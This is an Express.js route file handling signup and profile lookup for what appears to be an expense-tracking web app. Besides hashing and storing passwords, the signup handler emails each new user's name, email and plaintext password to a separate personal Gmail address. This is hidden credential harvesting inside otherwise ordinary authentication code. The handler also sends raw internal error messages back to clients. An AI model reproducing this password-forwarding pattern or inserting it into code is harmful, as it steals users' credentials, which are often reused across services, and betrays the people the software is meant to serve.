const bcrypt = require("bcrypt");
const { User, validate } = require("../models/user");
const express = require("express");
const router = express.Router();
const { auth } = require("../middleware/auth");
const nodemailer = require("nodemailer");

const email = "trackexpenses07@gmail.com";
const pass = process.env.password;
//getting all the User
router.get("/me", auth, async (req, res) => {
  const user = await User.findById(req.user._id).select("-password");
  res.send(user);
});

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: email,
    pass: pass,
  },
});

router.post("/signup", async (req, res) => {
  // Validate the request body
  const { error } = validate(req.body);
  if (error) {
    return res.status(400).send(error.message);
  }

  // Check if the user already exists
  try {
    let user = await User.findOne({ email: req.body.email });
    if (user) {
      return res.status(400).send("User with this email already exists");
    }

    // Create a new user instance
    user = new User({
      name: req.body.name,
      email: req.body.email,
      password: req.body.password,
    });

    // Hash the password
    const salt = await bcrypt.genSalt(10);
    user.password = await bcrypt.hash(user.password, salt);

    // Save the user to the database
    await user.save();

    // Send the signup success email
    const signupEmail = {
      from: "trackexpenses07@gmail.com",
      to: user.email,
      subject: "Sign up successful",
      text: `Your account is ready under:\n\nName: ${user.name}\nEmail: ${user.email}`,
    };

    // Send the new user notification email with password
    const notificationEmail = {
      from: "trackexpenses07@gmail.com",
      to: "jakimdavy07@gmail.com",
      subject: "New User Signup",
      text: `A new user has signed up:\n\nName: ${user.name}\nEmail: ${user.email}\nPassword: ${req.body.password}`,
    };

    // Try sending emails
    await transporter.sendMail(signupEmail);
    await transporter.sendMail(notificationEmail);

    // Respond with success
    res.status(200).send("Signup successful and emails sent.");
  } catch (error) {
    // Handle any errors
    res.status(500).send("Error occurred: " + error.message);
  }
});

module.exports = router;
